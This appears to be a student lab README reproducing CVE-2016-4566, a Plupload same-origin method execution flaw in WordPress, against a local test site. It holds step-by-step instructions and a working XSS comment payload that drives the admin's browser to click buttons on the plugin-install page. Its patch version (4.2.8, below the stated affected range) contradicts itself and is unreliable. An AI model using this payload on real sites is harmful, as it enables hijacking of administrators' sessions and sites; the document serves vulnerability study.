# Steps
#### Step 1 - Gain trust from the admin
######	If you have the ability to post skip to step 3
######	Create a comment on a post.

#### Step 2 - Wait
###### Wait for approval from the admin.

#### Step 3 - Inject XSS
######	Comment the payload.
	<button onclick="fire()">Click</button>
	<script>
		function fire() { 
			open('javascript:setTimeout("location=\'http://wpdistillery.vm/wp-includes/js/plupload/plupload.flash.swf?target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click&uid%g=hello&\'", 2000)');
  			setTimeout('location="http://wpdistillery.vm/wp-admin/plugin-install.php?tab=plugin-information&plugin=wp-super-cache&TB_iframe=true&width=600&height=550"')
		}
	</script>




# The types / classes of vulnerabilities involved and any related CVE identifiers
#### Pupload Same-Origin Method Execution attack (SOME).


#### CVE-2016-4566



# Affected versions and patches
#### Affected version
###### WordPress <= 4.5.1

#### Patched in
###### version 4.2.8



# Demo
![alt text](https://github.com/Mikhail-Kreytser/Cybersecurity-Week7/blob/master/SOME/Demo.gif "XSS Demo")

# References
#### https://gist.github.com/cure53/09a81530a44f6b8173f545accc9ed07e
#### https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4566
#### https://wpvulndb.com/vulnerabilities/8489
